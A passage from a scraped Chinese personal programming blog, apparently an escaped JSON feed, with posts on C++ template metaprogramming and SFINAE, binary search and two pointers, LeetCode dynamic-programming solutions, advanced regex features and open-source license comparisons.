hi\u0026lt;T, args...\u0026gt;::val); enum { val = (v \u0026lt; (Min\u0026lt;T, args...\u0026gt;::val) ? v : (Min\u0026lt;T, args...\u0026gt;::val) }; // Min\u0026lt;T, args...\u0026gt;::val 就是遞迴剩下的部分 case2: 如果只有一個數字 template\u0026lt;typename T, T v\u0026gt; struct Min\u0026lt;T,v\u0026gt; { enum { val = v }; }; turing-complete template是turing-complete，可以用template來實做lambda calculus 也不意外，template的參數帶入就是lambda calculus的beta reduction\n詳細的說明blog\ncode\nSolution to Exercise template \u0026lt;typename A, typename B\u0026gt; struct add {}; template \u0026lt;typename A_s, typename B\u0026gt; struct add\u0026lt;Succ\u0026lt;A_s\u0026gt;, B\u0026gt; { enum { value = 1+add\u0026lt;A_s,B\u0026gt;::value }; }; template \u0026lt;typename B\u0026gt; struct add\u0026lt;Zero, B\u0026gt; { enum { value = B::value }; }; template \u0026lt;typename lhs, typename rhs\u0026gt; struct Add {}; template \u0026lt;typename Lhs, typename Rhs, typename Env\u0026gt; struct Eval\u0026lt;Add\u0026lt;Lhs, Rhs\u0026gt; , Env\u0026gt; { typename Apply\u0026lt;Add\u0026lt;typename Eval\u0026lt;Lhs,Env\u0026gt; :: result , typename Eval\u0026lt;Rhs,Env\u0026gt; :: result \u0026gt;, Zero\u0026gt; :: result typedef result ; } ; template \u0026lt;typename N, typename M\u0026gt; struct Apply\u0026lt;Add\u0026lt;N, M\u0026gt;, Zero\u0026gt; { add\u0026lt;N,M\u0026gt; typedef result ; } ; trait 可以理解成type的interface，描述這個type會在編譯期這個type有什麼屬性\n那怎麼描述(寫下)有這些屬性?\n寫到定義中 (這比較像type屬性的getter) template \u0026lt;typename Iterator\u0026gt; struct iterator_traits { using value_type = typename Iterator::value_type; using pointer = typename Iterator::pointer; using const_pointer = typename Iterator::const_pointer; using reference = typename Iterator::reference; using const_reference = typename Iterator::const_reference; using rvalue_reference = typename Iterator::rvalue_reference; using iterator_category = typename Iterator::iterator_category; }; template \u0026lt;typename T\u0026gt; class vector_iterator { public: using value_type = T; using pointer = T *; using const_pointer = const T *; using reference = T \u0026amp;; using const_reference = const T \u0026amp;; using rvalue_reference = T \u0026amp;\u0026amp;; using iterator_category = std::random_access_iterator_tag; //... }; 特化 (這比較像描述一個type) template \u0026lt;typename Iterator\u0026gt; struct iterator_traits {}; template \u0026lt;typename T\u0026gt; struct iterator_traits\u0026lt;vector_iterator\u0026lt;T\u0026gt;\u0026gt; { using value_type = T; using pointer = T*; using const_pointer = const T *; using reference = T \u0026amp;; using const_reference = const T \u0026amp;; using rvalue_reference = const T \u0026amp;; using iterator_category = std::random_access_iterator_tag; }; SFINAE 就是compiler怎麼淘汰候選人的過程\n整個過程是有同樣名字的struct或是function都選出來，分別一個一個帶入，保留沒出事的，最後只剩下一個就用他\n最頭痛的是有同樣名字的struct或是function都選出來，分別一個一個帶入\n這樣子變成要確保沒每個template涵蓋到的部分不能與其他的宣告重疊，故個寫起來的感覺是\nif n == 1: return \u0026#39;hi\u0026#39; if n != 1: return \u0026#39;wow\u0026#39; 不能像\nif n == 1: return \u0026#39;hi\u0026#39; else: return \u0026#39;wow\u0026#39; 簡而言之， 我們沒有failover的宣告，每個都要描寫出來，n為一，n不為一， 不能是 n為一，其他\n要怎麼讓compiler淘汰候選人? 在\ntemplate列表 (template那一行) 特殊化列表 (function或是struct旁邊的角括號) 參數列表 (function的參數列表) 搞出奇怪的東西，像存取不存在的屬性、長度為零的array等等\n詳細的case見這裡 還有可以看看type_traits.hpp怎麼實作那些神奇的traits\n用enable_if試試看 enable_if會吃一個條件式，如果true吐一個type，如果false就會整個壞掉\n下面用enable_if來寫一個判斷int的函數\nf_if_integral_weak f_if_integral_weak沒辦法推出參數在此的type，故報錯\n如果要過，就要自己補type\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;type_traits\u0026gt; template \u0026lt;bool, typename\u0026gt; struct enable_if; template \u0026lt;typename T\u0026gt; struct enable_if\u0026lt;true, T\u0026gt; { using type = T; }; template \u0026lt;typename T\u0026gt; struct is_int { constexpr static inline auto value {false}; }; template \u0026lt;\u0026gt; struct is_int\u0026lt;int\u0026gt; { constexpr static inline auto value {true}; }; template \u0026lt;typename T\u0026gt; void f_if_integral_weak(typename enable_if\u0026lt;is_int\u0026lt;T\u0026gt;::value, T\u0026gt;::type) { std::cout \u0026lt;\u0026lt; \u0026#34;a: is int\\n\u0026#34;; } int main(int argc, char *argv[]) { f_if_integral_weak\u0026lt;int\u0026gt;(10); //f_if_integral_weak(0); // 0是誰? //f_if_integral_weak(0.0); // 沒有type f_if_integral_weak\u0026lt;int\u0026gt;(0); } f_if_integral_strong 手動打type在此蠻沒意義的，所以試著讓compiler自己推，原本的enable_if用預設參數補\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;type_traits\u0026gt; template \u0026lt;bool, typename\u0026gt; struct enable_if; template \u0026lt;typename T\u0026gt; struct enable_if\u0026lt;true, T\u0026gt; { using type = T; }; template \u0026lt;typename T\u0026gt; struct is_int { constexpr static inline auto value {false}; }; template \u0026lt;\u0026gt; struct is_int\u0026lt;int\u0026gt; { constexpr static inline auto value {true}; }; template \u0026lt;typename T\u0026gt; void f_if_integral_strong(T, typename enable_if\u0026lt;is_int\u0026lt;T\u0026gt;::value, T\u0026gt;::type* = 0) { std::cout \u0026lt;\u0026lt; \u0026#34;b: is int\\n\u0026#34;; } int main(int argc, char *argv[]) { f_if_integral_strong(0); //f_if_integral_strong(0.0); // 沒有type阿 } f_if_integral_stronger 為什麼不用typename enable_if\u0026lt;!is_int\u0026lt;T\u0026gt;::value, T\u0026gt;::type來加不是int的case? 因為typename enable_if\u0026lt;!is_int\u0026lt;T\u0026gt;::value, T\u0026gt;::type與typename enable_if\u0026lt;is_int\u0026lt;T\u0026gt;::value, T\u0026gt;::type最後推出來的type是一樣的 這樣compiler分不出來!!\n但可以把另一個case放到別的地方，來區分兩個case\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;type_traits\u0026gt; template \u0026lt;bool, typename\u0026gt; struct enable_if; template \u0026lt;typename T\u0026gt; struct enable_if\u0026lt;true, T\u0026gt; { using type = T; }; template \u0026lt;typename T\u0026gt; struct is_int { constexpr static inline auto value {false}; }; template \u0026lt;\u0026gt; struct is_int\u0026lt;int\u0026gt; { constexpr static inline auto value {true}; }; template \u0026lt;typename T, typename = typename enable_if\u0026lt;is_int\u0026lt;T\u0026gt;::value, T*\u0026gt;::type\u0026gt; void f_if_integral_stronger(T) { std::cout \u0026lt;\u0026lt; \u0026#34;c: is int\\n\u0026#34;; } template \u0026lt;typename T\u0026gt; void f_if_integral_stronger(T, typename enable_if\u0026lt;!is_int\u0026lt;T\u0026gt;::value, T\u0026gt;::type* = 0) { std::cout \u0026lt;\u0026lt; \u0026#34;c: not int\\n\u0026#34;; } int main(int argc, char *argv[]) { f_if_integral_stronger(0.0); f_if_integral_stronger(0); } 其實可以簡單一點 用特別化就好\ntemplate \u0026lt;typename T\u0026gt; void f(T) { std::cout \u0026lt;\u0026lt; \u0026#34;not int\\n\u0026#34;; } template \u0026lt;\u0026gt; void f\u0026lt;int\u0026gt;(int) { std::cout \u0026lt;\u0026lt; \u0026#34;is int\\n\u0026#34;; } int main(int argc, char *argv[]) { f(1); f(1.1); f(\u0026#34;1234\u0026#34;); } and_in_template 這裡模擬\u0026amp;\u0026amp;，但要怎麼判斷true與false?\n有沒有壞掉!!\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;type_traits\u0026gt; template \u0026lt;typename ...\u0026gt; struct and_in_template { using type = void; }; template \u0026lt;typename S\u0026gt; void has_A_B(S,typename and_in_template\u0026lt;typename S::A, typename S::B\u0026gt;::type* = 0) { std::cout \u0026lt;\u0026lt; \u0026#34;get it\\n\u0026#34;; } struct Ans { struct A{}; struct B{}; }; int main(int argc, char *argv[]) { Ans a; has_A_B(a); } concept C++20的東西，可以對type的要求寫下來成為concept\n之後就可以用require搭配其他concept一起用，\nConjunction (AND) Disjunction (OR) 有一個名詞是Atomic constraint，其實就是會回傳bool的type_trait，只是原本type_trait要自己訂欄位放結果，但concept可以直接return\ntemplate\u0026lt;typename T\u0026gt; struct S { constexpr operator bool() const { return true; } }; template\u0026lt;typename T\u0026gt; requires (S\u0026lt;T\u0026gt;{}) void f(T); 所以concept其實就是使用SFINAE的template程式碼的語法糖?\ntemplate\u0026lt;typename T\u0026gt; concept Hashable = requires(T a) { a.keep_walking { std::hash\u0026lt;T\u0026gt;{}(a) } -\u0026gt; std::convertible_to\u0026lt;std::size_t\u0026gt;; }; struct meow {}; template\u0026lt;Hashable T\u0026gt; void f(T); // constrained C++20 function template // Alternative ways to apply the same constraint: // template\u0026lt;typename T\u0026gt; // requires Hashable\u0026lt;T\u0026gt; // void f(T); // // template\u0026lt;typename T\u0026gt; // void f(T) requires Hashable\u0026lt;T\u0026gt;; int main() { f(\u0026#34;abc\u0026#34;); // OK, std::string satisfies Hashable f(meow{}); // Error: meow does not satisfy Hashable } Ref C++ Core Guidelines: Rules for Template Metaprogramming 【C++ Template Meta-Programming】認識樣板超編程 (TMP)\ndecltype\n【C++ Template Meta-Programming】參數列表\nC++ templates: Creating a compile-time higher-order meta-programming language\nWhy can\u0026rsquo;t I use float value as a template parameter? Why can templates only be implemented in the header file? C++ template function compiles in header but not implementation\n细说 C++ Traits Classes 【C++ Template Meta-Programming】Traits 技巧 C++ TUTORIAL - TRAITS : A TEMPLATE SPECIALIZATION - 2020\nSFINAE SFINAE（替換失敗不是錯誤） 認識SFINAE Substitution failure is not an error 【C++ Template Meta-Programming】函式多載與 SFINAE 初步 【C++ Template Meta-Programming】SFINAE 【C++ Template Meta-Programming】到處 SFINAE\n说说 C++ 的 Concept Constraints and concepts (since C++20)\n","permalink":"https://littlebees.github.io/2020/12/c-template-meta-programming%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e一切的\u003ca href=\"https://stackoverflow.com/questions/8542591/c11-reverse-range-based-for-loop\"\u003e開始\u003c/a\u003e，只是想要個reversed而已，就順便把tmp補完\u003c/p\u003e","title":"C++ template meta-programming筆記"},{"content":"動機 Algorithm, Leetcode 101有提到binary search 可以當成 two pointer 的特別case，就來看看到底哪裡相關\n丟掉哪些? two pointer一次都只移動一格，一次只丟掉一個 binary search是一次移動一半，一次丟掉一半\ntwo pointer 3sum 每做完一次2sum就丟掉一個最小的\ndef sum2(arr,target): i = 0 j = len(arr)-1 while i\u0026lt;j: if arr[i]+arr[j] == target: return True elif arr[i]+arr[j] \u0026gt; target: j -= 1 else: i += 1 return False def sum3(arr,target): for i in range(len(arr)): if sum2(arr[i:],target-arr[i]): return True return False binary search 一次丟一半\n最大值最小化 注意，這裡的有序是廣義的有序，如果一個數組中的左側或者右側都滿足某一種條件，而另一側都不滿足這種條件，也可以看作是一種有序。\n換言之，二分搜索法可以用來查找滿足某種條件的最大（最小）的值。 (lowerbound)\n答案在一個固定區間內； 可能查找一個符合條件的值不是很容易，但是要求能比較容易地判斷某個值是否是符合條件的； 可行解對於區間滿足一定的單調性。換言之，如果x是符合條件的，那麼有x+1或者x-1也符合條件。 （這樣下來就滿足了上面提到的單調性） 二分搜一個是找有沒有目標值，另一個是猜答案\n通常會有一個函數去check答案是比目標大還是小，之後就是對答案的range做二分搜\nbasic arr = [1,2,3] i = 0 j = len(arr) while i \u0026lt; j: mid = i+(j-i)//2 if arr[mid] == target: return mid elif arr[mid] \u0026gt; target: j = mid else: i = mid+1 return False 雖然說一般常看到的bsearch都是只比中點，一般來說這樣也夠了，但其實應該這樣寫，才能比較靈活運用bsearch\narr = [1,2,3] i = 0 j = len(arr) while i \u0026lt; j: mid = i+(j-i)//2 if arr[mid] == target: return mid elif arr[mid] \u0026lt; target \u0026lt;= arr[j-1]: # 在這個範圍才進去 j = mid else: i = mid+1 return False lower bound lower_bound: 第一個 大於等於(不小於) target的位置\narr = [1,2,3] i = 0 j = len(arr) while i \u0026lt; j: mid = i+(j-i)//2 if arr[mid] \u0026lt; target: i = mid+1 else: j = mid return False upper bound upper_bound: 第一個 大於 target的位置\narr = [1,2,3] i = 0 j = len(arr) while i \u0026lt; j: mid = i+(j-i)//2 if arr[mid] \u0026lt; target: i = mid+1 else: j = mid return False 三分法 三分法可以用来查找凸函數的最大（小）值。\nleft ... lmid ... rmid ... right 如果lmid \u0026lt;= rmid，這樣極值一定不在lmid的左手邊(left ~ lmid)\n如果lmid \u0026gt; rmid，這樣極值一定不在rmid的右手邊(rmid ~ right)\nlmid = left + (right - left \u0026gt;\u0026gt; 1) rmid = lmid + (right - lmid \u0026gt;\u0026gt; 1) # 對右側區間取半 if (cal(lmid) \u0026gt; cal(rmid)) right = rmid else left = lmid 丟一半與丟一個: leetcode 154 array被rotate過，不過只要是有排序的range就可以放心地用binary search\n因此第一件事是判斷現在是不是在有排序的range中，如果不是就只丟一個最左的 剩下就是binary search與遞迴會處理\ndef f(ns,l,r): if abs(l-r) \u0026lt;= 1: return min(ns[l],ns[r]) else: mid = (l+r)//2 if ns[l] \u0026lt; ns[mid]: if ns[mid] \u0026gt; ns[r]: return f(ns,mid+1,r) else: return f(ns,l,mid-1) elif ns[mid] \u0026lt; ns[r]: if ns[mid-1] \u0026lt; ns[r]: return f(ns,l,mid-1) else: return f(ns,mid,r) elif ns[l] == ns[mid]: return f(ns,l+1,r) else: return f(ns,l,r-1) class Solution: def findMin(self, ns: List[int]) -\u0026gt; int: return f(ns,0,len(ns)-1) leetcode 153 array被rotate過，但沒有重複，所以都是有排序的range，只要找出能用binary search就用，剩下遞迴\ndef f(ns,l,r): if abs(l-r) \u0026lt;= 1: return min(ns[l],ns[r]) else: mid = (l+r)//2 if ns[l] \u0026lt; ns[mid]: if ns[mid] \u0026gt; ns[r]: return f(ns,mid+1,r) else: return f(ns,l,mid-1) else: if ns[mid-1] \u0026lt; ns[r]: return f(ns,l,mid-1) else: return f(ns,mid,r) class Solution: def findMin(self, ns: List[int]) -\u0026gt; int: return f(ns,0,len(ns)-1) 判圈演算法 def floyd(node): i = node j = node while i and j and j.next and i is not j: i = next(i) j = next(next(j)) return i is j and j is not node 假設到loop前的長度是a，loop長為b i走了a+x*b+t，j走了a+y*b+t 其中j走的距離是i的兩倍，兩者相減，i == (y-x)*b\ni是圈數的倍數，換言之，現在的i不管從哪邊走都是起點 所以，把其中一個放回起點，兩方開始一步一步走，相遇點就是起點\n有起點找長度就簡單了，就是讓其中一方走到相遇就好\nP.S.: linked list 的中點 這裡是利用1個走一倍1個走兩倍的特性，開始走得快的先到底，那麼走得慢的一定在中點\ndef mid(root): i = root j = root while j and j.next: i = next(i) j = next(next(j)) return i ","permalink":"https://littlebees.github.io/2020/12/%E4%BA%8C%E5%88%86%E6%90%9C%E5%B0%8B%E8%88%87two-pointer/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/changgyhub/leetcode_101\"\u003eAlgorithm, Leetcode 101\u003c/a\u003e有提到binary search 可以當成 two pointer 的特別case，就來看看到底哪裡相關\u003c/p\u003e","title":"二分搜尋與two pointer"},{"content":"動機 分治與dp在轉念之間\nProblem You are given n balloons, indexed from 0 to n - 1. Each balloon is painted with a number on it represented by an array nums. You are asked to burst all the balloons.\nIf you burst the ith balloon, you will get nums[i - 1] * nums[i] * nums[i + 1] coins. If i - 1 or i + 1 goes out of bounds of the array, then treat it as if there is a balloon with a 1 painted on it.\nReturn the maximum coins you can collect by bursting the balloons wisely.\nExample 1:\nInput: nums = [3,1,5,8]Output: 167Explanation:nums = [3,1,5,8] --\u003e [3,5,8] --\u003e [3,8] --\u003e [8] --\u003e []coins = 3*1*5 + 3*5*8 + 1*3*8 + 1*8*1 = 167Example 2:\nInput: nums = [1,5]Output: 10 Constraints:\nn == nums.length1 \u003c= n \u003c= 5000 \u003c= nums[i] \u003c= 100 思路 如果只看這個位置的最大分數，會發現整個變成分治後遞迴，之後TLE\n為什麼會變成分治? 爆完一顆氣球後就變成兩邊了!!\n有什麼是連續的，不是像還沒爆完的氣球，分成兩邊? 已經爆完的氣球都是在一起的!!\n所以要變成看這個範圍的最大分數，分數就變成，\nf[i..j] \u0026lt;= i~j都被爆完後的最大分數 = score[i-1]*score[j+1]*score[k] \u0026lt;= 從k爆後的分數 + f[i..k] \u0026lt;= 左邊的最大分數 (因k已經被爆了，所以要包進來不能是f[i..(k-1)] + f[k..j] \u0026lt;= 右邊的最大分數 可以想成把所有單點爆的解都收在一起，去列舉去找\nVer1: hash 超慢，大概1400ms，用hash這麼慢??\n裡面是不是用hash function實作的? python對大塊的資料做操作時效能都很悲劇\ndef def_list(l,i): if i \u0026lt; 0: return 1 try: return l[i] except IndexError: return 1 # 一般作二分，會把重點放在兩邊，但不是分割點 # 不過這次的重點是分割點 class Solution: def maxCoins(self, ns: List[int]) -\u0026gt; int: if not ns: return 0 dp = {} for i in range(0,len(ns)): dp[(i,i)] = ns[i]*def_list(ns,i-1)*def_list(ns,i+1) for k in range(1,len(ns)): for i in range(0,len(ns)-k): j = i+k #print(i,j) if j \u0026lt; len(ns): for x in range(i,j+1): dp[(i,j)] = max(dp.get((i,j),0), dp.get((i,x-1),0)+dp.get((x+1,j),0)+ns[x]*def_list(ns,j+1)*def_list(ns,i-1)) print(dp) return dp[(0,len(ns)-1)] Ver2: array 改用傳統手法就好多了\nclass Solution: def maxCoins(self, ns: List[int]) -\u0026gt; int: if not ns: return 0 ns = [1, *ns, 1] dp = [[0]*(len(ns)) for i in range(len(ns))] for i in range(1,len(ns)-1): dp[i][i] = ns[i]*ns[i-1]*ns[i+1] dp[0][0] = ns[1] dp[-1][-1] = ns[-2] for k in range(2,len(ns)): for i in range(0,len(ns)-k): j = i+k for x in range(i+1,j): dp[i][j] = max(dp[i][j], ns[i]*ns[j]*ns[x]+dp[i][x]+dp[x][j]) #print(dp) return dp[0][-1] case study: top-down 超漂亮，還用到了\nfunctools.lru_cache: 這樣就不用自己設table for-range: 直接用在max上!! class Solution: def maxCoins(self, nums: List[int]) -\u0026gt; int: nums = [1] + nums + [1] @functools.lru_cache(None) def dp(left, right): if left + 1 == right: return 0 return max( nums[left] * nums[i] * nums[right] + dp(left, i) + dp(i, right) for i in range(left+1, right) ) return dp(0, len(nums)-1) ","permalink":"https://littlebees.github.io/2020/12/leetcode-312-burst-balloons/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e分治與dp在轉念之間\u003c/p\u003e","title":"leetcode-312 - Burst Balloons"},{"content":"動機 超越NFA的regex，酷!!\n從NFA開始 .(任一字元): transition |: 分岔到兩個state *: loop 或是 直接跳到下一個state +: ..* {n,}: \u0026lt;pat\u0026gt;\u0026lt;pat\u0026gt;..(重複n-1次)\u0026lt;pat\u0026gt;+\n\\b: word boundry，可以把單字(字母與數字)從其他非單字字元的包圍中抽出來\nre.findall(r\u0026#39;\\b[0-9]+?\\b\u0026#39;,\u0026#34;~123 456* 567\u0026#34;) \\B: not word boundry，就是不是word boundry的字元\nre.findall(r\u0026#39;\\B[0-9]+\\B\u0026#39;,\u0026#34;~123 456* 567\u0026#34;) ?: 除了是0或1的外，還有一個用法是不要比對到底(Laziness)，像.*原本會把所有字元都吃掉，但變成.*?後就不會試著全部match，而是只match可以過的部分，其他交給別的pattern\n從NFA到PDA group (ptr): 把比對到的東西放到regex engine的變數(stack)中 (\u0026lt;pat\u0026gt;) named group: group多了名字 (?P\u0026lt;name\u0026gt;\u0026lt;pat\u0026gt;) non-capturing group: pattern不放到regex engine的變數(stack)中 (?:\u0026lt;pat\u0026gt;)\natomic group(Once-only Subexp­ression): 會cut的group (?\u0026gt;\u0026lt;pat\u0026gt;)\n這個需要例子，像是a(?\u0026gt;bc|b)c去比對abbcdabcc 會先match到ab剩下的pattern是c剩下的string是dabcc，這會失敗，所以會retry\n但，因為atomic group會cut，他會把已經比對過的string都忘掉，所以接下去是從bcdabcc， 最後match到abcc\nback reference: 透過變數使用之前比對到的東西來比對 \\n\nre.search(r\u0026#39;(hello) \\1 \\S+\u0026#39;, \u0026#39;This is a hello hello world!\u0026#39;) re.search(r\u0026#39;(\\\u0026#39;|\\\u0026#34;).*\\1\u0026#39;,\u0026#34;\\\u0026#34;This is a \\\u0026#39;string\\\u0026#39;\\\u0026#34;\u0026#34;) 從PDA到Turing Machine lookahead: 先往後(右)看如果match才繼續下去(如果是negtive，就是不match才繼續下去) (?=\u0026lt;pat\u0026gt;) (?!\u0026lt;pat\u0026gt;)\nlookbehind: 先往前(左)看如果match才繼續下去(如果是negtive，就是不match才繼續下去) (?\u0026lt;=\u0026lt;pat\u0026gt;) (?\u0026lt;!\u0026lt;pat\u0026gt;)\nre.search(r\u0026#39;(?\u0026lt;=cda).*(?=c)\u0026#39;,\u0026#39;abbcdabcc\u0026#39;) re.search(r\u0026#39;(?=cda).*\u0026#39;,\u0026#39;abbcdabcc\u0026#39;) Recursion: 再複製一次pattern，再跑一次match，在Turing Machine可以當成把指針移到pattern的開頭 ?n OR ?R\nregex.search(r\u0026#34;^(\\((?1)*\\))(?1)*$\u0026#34;, \u0026#34;()()\u0026#34;) regex.search(r\u0026#34;(\\w)((?R)|(\\w?))\\1\u0026#34;, \u0026#34;kayak\u0026#34;) 還有condition，但暫時搞不懂怎麼用，先放著\nRef great cheatsheet concepts in advanced regex Recursive Regular Expression\n","permalink":"https://littlebees.github.io/2020/12/%E9%80%B2%E6%93%8A%E7%9A%84regex/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e超越NFA的regex，酷!!\u003c/p\u003e","title":"進擊的regex"},{"content":"動機 insert是最難想的部分\nProblem Given two strings word1 and word2, return the minimum number of operations required to convert word1 to word2.\nYou have the following three operations permitted on a word:\nInsert a characterDelete a characterReplace a character Example 1:\nInput: word1 = horse, word2 = rosOutput: 3Explanation: horse -\u003e rorse (replace 'h' with 'r')rorse -\u003e rose (remove 'r')rose -\u003e ros (remove 'e')Example 2:\nInput: word1 = intention, word2 = executionOutput: 5Explanation: intention -\u003e inention (remove 't')inention -\u003e enention (replace 'i' with 'e')enention -\u003e exention (replace 'n' with 'x')exention -\u003e exection (replace 'n' with 'c')exection -\u003e execution (insert 'u') Constraints:\n0 \u003c= word1.length, word2.length \u003c= 500word1 and word2 consist of lowercase English letters. Sol 用兩個index表示比到哪裡，如果一樣就一起後退 不一樣就要經歷insert, replace, 或 delete\nreplace很好理解，就是換成一樣的，這樣兩個就一起後退\ndelete也不難想像，就是刪第一個string，所以只退第一個\n但insert對我就不好理解，最後想到的理解方式是\n因為第一個string目前的index沒有動，所以不變，但是多了match第二個string的字，所以第二個要後退\n像\u0026quot;123\u0026quot;在index是2的地方insert，就會變成\u0026quot;1234\u0026quot;，然而index還是在2，但第二個string一定會被match，所以第二個要後退\nclass Solution: def __init__(self): self.dp = {} def f(self,s1,s2,i,j): if (i,j) not in self.dp: if i \u0026lt; 0 and j \u0026lt; 0: return 0 elif i \u0026lt; 0: self.dp[(i,j)] = self.f(s1,s2,i,j-1) + 1 elif j \u0026lt; 0: self.dp[(i,j)] = self.f(s1,s2,i-1,j) + 1 elif s1[i] == s2[j]: self.dp[(i,j)] = self.f(s1,s2,i-1,j-1) else: self.dp[(i,j)] = min(self.f(s1,s2,i-1,j-1),self.f(s1,s2,i,j-1),self.f(s1,s2,i-1,j))+1 return self.dp[(i,j)] def minDistance(self, word1: str, word2: str) -\u0026gt; int: self.dp = {} return self.f(word1,word2,len(word1)-1,len(word2)-1) ","permalink":"https://littlebees.github.io/2020/12/leetcode-72-edit-distance/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003einsert是最難想的部分\u003c/p\u003e","title":"leetcode-72 - Edit Distance"},{"content":"動機 因為授權的緣故讓我以為我做了一個禮拜的白工， 到之後再花一個禮拜生出替代方案， 最後發現其實最初的方案可以用，不過這時最初的code已經不知道跑到哪裡去了QwQ\n所以整理一下常見的開源授權，讓自己下次不要再被婊了QQ\n如何使用、如何修改、如何釋出 使用 引用(動態連結) 整包使用 修改 改一部分的code 擴充code(衍生) 發布 source code binary 使用權(像PaaS或SaaS，code都是在自己的機器上跑，其實不算一般的發布) 授權會要求的是? 開放原始碼 保留copyright(在code最上面的那一大串) 保留License 附上修改聲明 看看有什麼授權 下面提到的授權都要求\n保留copyright(在code最上面的那一大串) 保留License 但寫出來的code要不要\n開放原始碼 用同一個授權(感染) 附上修改聲明 (這就GPL系列與Apache要) 是有變化的 開放原始碼 Apache, BSD, MPL, MIT 使用 引用(動態連結) =\u0026gt; X 整包使用 =\u0026gt; X 修改 改一部分的code =\u0026gt; X 擴充code(衍生) =\u0026gt; X 發布 source code =\u0026gt; X binary =\u0026gt; X 使用權 =\u0026gt; X GPL 使用 引用(動態連結) =\u0026gt; O 整包使用 =\u0026gt; O 修改 改一部分的code =\u0026gt; O 擴充code(衍生) =\u0026gt; O 發布 source code =\u0026gt; O binary =\u0026gt; O 使用權 =\u0026gt; X LGPL 使用 引用(動態連結) =\u0026gt; X 整包使用 =\u0026gt; O 修改 改一部分的code =\u0026gt; O 擴充code(衍生) =\u0026gt; O 發布 source code =\u0026gt; O binary =\u0026gt; O 使用權 =\u0026gt; X AGPL 使用 引用(動態連結) =\u0026gt; O 整包使用 =\u0026gt; O 修改 改一部分的code =\u0026gt; O 擴充code(衍生) =\u0026gt; O 發布 source code =\u0026gt; O binary =\u0026gt; O 使用權 =\u0026gt; O 寫出來的code要不要用同一個授權(感染) 這邊基本上是與code有關，所以下面列出的使用情境會把發布省略掉\nBSD, Apache, MIT 使用 引用(動態連結) =\u0026gt; X 整包使用 =\u0026gt; X 修改 改一部分的code =\u0026gt; X 擴充code(衍生) =\u0026gt; X MPL 使用 引用(動態連結) =\u0026gt; X 整包使用 =\u0026gt; X 修改 改一部分的code =\u0026gt; O 擴充code(衍生) =\u0026gt; O GPL, AGPL 使用 引用(動態連結) =\u0026gt; O 整包使用 =\u0026gt; O 修改 改一部分的code =\u0026gt; O 擴充code(衍生) =\u0026gt; O LGPL 使用 引用(動態連結) =\u0026gt; X 整包使用 =\u0026gt; O 修改 改一部分的code =\u0026gt; O 擴充code(衍生) =\u0026gt; O 等等，MIT,BSD與Apache差在哪裡? Apache把所有授權範圍都寫得好好的，但BSD只有三句話(還有兩句話)\nMIT更少只有一句話\nMIT與BSD的兩句話版本 只要求\n保留copyright 保留License BSD的三句話版本 要求\n保留copyright 保留License 不要用作者的名字做行銷 Apache寫了很多，需要注意的(與code有關的)是附上修改聲明，註明改過的地方\nRef 開放源碼授權概觀（上） 開放源碼授權概觀（下） Open Source授權條款整理 Choose an open source license 常見的五個開源專案授權條款，使用軟體更自由 在開源時代的興起下，如何透過License共享並保有權益 開放原始碼(開源)授權(Open Source License)比較：GPL, LGPL, BSD, Apache, MIT 五種開源授權規範的比較 (BSD, Apache, GPL, LGPL, MIT) [開源教]教我正確選擇軟體授權\n","permalink":"https://littlebees.github.io/2020/11/opensource%E6%8E%88%E6%AC%8A/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e因為授權的緣故讓我以為我做了一個禮拜的白工，\n到之後再花一個禮拜生出替代方案，\n最後發現其實最初的方案可以用，不過這時最初的code已經不知道跑到哪裡去了QwQ\u003c/p\u003e\n\u003cp\u003e所以整理一下常見的開源授權，讓自己下次不要再被婊了QQ\u003c/p\u003e","title":"OpenSource授權"},{"content":"動機 這題體現了二分法是一種藝術\nProblem Given two sorted arrays nums1 and nums2 of size m and n respectively, return the median of the two sorted arrays.\nThe overall run time complexity should be O(log (m+n)).\nExample 1:\nInput: nums1 = [1,3], nums2 = [2]Output: 2.00000Explanation: merged array = [1,2,3] and median is 2.Example 2:\nInput: nums1 = [1,2], nums2 = [3,4]Output: 2.50000Explanation: merged array = [1,2,3,4] and median is (2 + 3) / 2 = 2.5.Example 3:\nInput: nums1 = [0,0], nums2 = [0,0]Output: 0.00000Example 4:\nInput: nums1 = [], nums2 = [1]Output: 1.00000Example 5:\nInput: nums1 = [2], nums2 = []Output: 2.00000 Constraints:\nnums1.length == mnums2.length == n0 \u003c= m \u003c= 10000 \u003c= n \u003c= 10001 \u003c= m + n \u003c= 2000-106 \u003c= nums1[i], nums2[i] \u003c= 106 Sol 算中位數就是找中間的數，不然就是中間的兩個加起來除二， 但這裡我們沒辦法得到數字的座標，有沒有其他方法可以到中間?\n用merge去數，數到一半就好， 但這要O(n+m)\n能不能數快一點?\n我們在merge時需要那些小數字嗎? 不用\n我們能知道有沒有辦法確認這一區都是小數字? [1,2,3,4] 的話，i=2時能確認不論如何i\u0026lt;2的元素一定都比3小\n如果兩條array都取同樣長度，像 [1,3,5]與[2,4,7]長度都2取會得到[1,3]與[2,4]\n因為第一個array最後一個是3，所以裡面的元素都小於等於3，同理， 第二個array最後一個是4，所以裡面的元素都小於等於4\n這樣我們可以知道有\n兩個小於3 兩個小於4 而中位數一定在大的區間，所以可以把 兩個小於3 的區間當成已經merge的區間忽略不看\n可以這樣如法炮製，就可以一直去掉最小的區間，最後只剩下一的話這就是我們要的數字。\n這邊的思考方式是反覆挑一個array去出一半長度的array，因為每次都挑最小的，所以最後要的數字一定在某個array\n用[0,3,5,7,9]與[2,2]當例子，求中位數\nlen:4 =\u0026gt; 4//2 =\u0026gt; {2, 2} len:2 =\u0026gt; 2//2 =\u0026gt; {2, 2, 0} len:1 =\u0026gt; 3 def getN(n,i): if i \u0026gt;= len(n): return 999999 else: return n[i] def f(n1,n2,k): #print(n1,n2,k) if len(n1) == 0: return getN(n2, k-1) elif len(n2) == 0: return getN(n1, k-1) if k == 